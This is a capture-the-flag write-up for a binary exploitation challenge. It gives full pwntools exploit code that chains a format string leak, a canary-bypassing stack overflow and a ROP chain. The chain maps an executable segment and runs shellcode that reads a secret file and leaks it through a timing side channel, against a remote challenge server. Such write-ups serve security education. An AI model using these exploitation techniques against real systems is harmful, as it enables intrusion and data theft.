# [HV23.22] Secure Gift Wrapping Service

## Introduction

Difficulty: 1337<br>
Author: darkice

This year, a new service has been launched to support the elves in wrapping gifts. Due to a number of stolen gifts in recent days, increased security measures have been introduced and the gifts are being stored in a secret place. As Christmas is getting closer, the elves need to load the gifts onto the sleigh, but they can't find them. The only hint to this secret place was probably also packed in one of these gifts. Can you take a look at the service and see if you can find the secret?

## Solution

Oh god, second difficult `pwn` challenge, but this time without an unintended solution, let's get this party started...

Starting off, there's a clear format string vulnerability in the first few lines, when prompted for our name, we can leak supply up to 20 characters used for leaking important addresses. Looking through gdb for a while, we can get `canary: %43$p, __libc_start_main+48: %45$p, main: %47$p` by submitting these leaks for our name.

```c
puts("Welcome to the secure gift wrapping service!\n");
printf("Who should the gifts be for? ");
fgets(s, 20, stdin);
printf("Processing the wishes of ");
printf(s);
```

Nice, we got all addresses we need and can fit them into a single leak. We can get the base addresses the following way:

```py        
libc = ELF('./libc_docker.so.6')
prog = ELF('./pwn')

libc_offset = libc.sym['__libc_start_main']
main_offset = prog.sym['main']

canary = int(leaks[0], 16)
libc_base = int(leaks[1], 16) - libc_offset + 48
pie_base = int(leaks[2], 16) - main_offset
```

Well, now the next problem arrives, we need a buffer overflow. After playing around a bit with `gdb` and using `cyclic` as an input for the first wish, then submitting single characters, we find `qaacraacsaact` in our `rbp`, which is at offset `264` when using `cyclic.find(b'aacuaacv')`.

Now we know our payload should look something like this:

```
264 Chars
    +
Stack Canary
    +
ROP Chain
```

This doesn't really help much because in the next few lines, there's some seccomp rules:

```c
v8 = seccomp_init(0LL);
seccomp_rule_add(v8, 2147418112LL, 60LL, 0LL);
seccomp_rule_add(v8, 2147418112LL, 231LL, 0LL);
seccomp_rule_add(v8, 2147418112LL, 0LL, 0LL);
seccomp_rule_add(v8, 2147418112LL, 2LL, 0LL);
seccomp_rule_add(v8, 2147418112LL, 257LL, 0LL);
seccomp_rule_add(v8, 2147418112LL, 9LL, 0LL);
seccomp_rule_add(v8, 2147418112LL, 3LL, 0LL);
seccomp_load(v8);
seccomp_release(v8);
```

This limits our available `syscall`'s to `exit, exit_group, read, open, openat, mmap, close`, this is bad, we don't get a `write`...

After spending way too much time I figured out (with the help of someone else ;)), that you can use the available `syscall`'s to create a new `rwx` segment in our program, load our own `asm` into it and then call the newly created segment.

```py
rop = ROP(libc)

rop.raw(rop.find_gadget(['ret']))
rop.raw(libc.address + 0x0000000000041979) # pop rcx ; add eax, 0x1a0751 ; ret
rop.raw(32)
rop.raw(libc.address + 0x000000000002a3e5) # pop rdi ; ret
rop.raw(prog.sym['gifts'])
rop.raw(libc.address + 0x0000000000054d69) # shl r9, cl ; mov qword ptr [rdi], r9 ; ret

new_segment = prog.address + 0x6000
rop.mmap(new_segment, 0x1000, 7, 0x2|0x20)
rop.read(0, new_segment, 100)
rop.call(new_segment)
```

First we initialize `rcx`, `rdi` and `r9`, then we call `mmap` using `pwntools`, which automatically sets a few registers with our needed values. `rdi=new_segment`, `rsi=length (0x1000)`, `rdx=PROT_READ|PROT_WRITE|PROT_EXEC`, `r10=MAP_PRIVATE|MAP_ANONYMOUS`

Then we just have to build our `asm` to brute-force character for character of our flag, if the character is correct, we will jump into a loop so we can get a timeout in our program.

Our final exploit code looks like this:

```py
from pwn import *
import string

context.log_level = 'error'
context.arch = 'amd64'

flagLen = 0x30
print("[+] Flag: HV23{", end="")
for location in range(5, flagLen):
    for ch in '_}' + string.ascii_lowercase + string.digits:
        rem = remote('152.96.15.10', 1337)
        rem.sendlineafter(b'? ', f'%43$p.%45$p.%47$p'.encode())
        leaks = rem.recvuntil(b'Name a ').lstrip(b'Processing the wishes of ').rstrip(b'\n\nName a ').split(b'.')

        libc = ELF('./libc_docker.so.6')
        prog = ELF('./pwn')

        libc_offset = libc.sym['__libc_start_main']
        main_offset = prog.sym['main']

        canary = int(leaks[0], 16)
        libc_base = int(leaks[1], 16) - libc_offset + 48
        pie_base = int(leaks[2], 16) - main_offset

        # print(f'Canary: {hex(canary)}')
        # print(f'libc_base: {hex(libc_base)}')
        # print(f'pie_base: {hex(pie_base)}')

        libc.address = libc_base
        prog.address = pie_base

        rop = ROP(libc)

        rop.raw(rop.find_gadget(['ret']))
        rop.raw(libc.address + 0x0000000000041979) # pop rcx ; add eax, 0x1a0751 ; ret
        rop.raw(32)
        rop.raw(libc.address + 0x000000000002a3e5) # pop rdi ; ret
        rop.raw(prog.sym['gifts'])
        rop.raw(libc.address + 0x0000000000054d69) # shl r9, cl ; mov qword ptr [rdi], r9 ; ret
        
        new_segment = prog.address + 0x6000
        rop.mmap(new_segment, 0x1000, 7, 0x2|0x20)
        rop.read(0, new_segment, 100)
        rop.call(new_segment)

        payload = b'A'*264
        payload += p64(canary)
        payload += rop.chain()

        rem.sendlineafter(b'wish: ', payload)

        for i in range(4):
            rem.sendlineafter(b'wish: ', b'a')

        file_name = next(prog.search(b'secret.txt'))
        data_segment = prog.address + 0x4000

        shellcode = asm(f'''
        mov rdi, {hex(file_name)}
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 2
        syscall

        mov rdi, rax
        mov rsi, {hex(data_segment)}
        mov rdx, 0x30
        xor rax, rax
        syscall

        mov rsi, {hex(data_segment)}
        add rsi, {hex(location)}
        xor rax, rax
        mov al, {hex(ord(ch))}
        mov bl, [rsi]
        cmp al, bl

        je L2
        jmp done
        L2:
        nop
        jmp L2
        done:
        nop
        ''')

        before = time.time()
        try:
            rem.sendline(shellcode)
            ret = rem.recvall(timeout=3)
            if time.time() - before >= 3:
                print(ch, end="")
                break
        except:
            if time.time() - before >= 3:
                print(ch, end="")
                break
```

Flag: `HV23{t1m3_b4s3d_s3cr3t_exf1ltr4t10n}`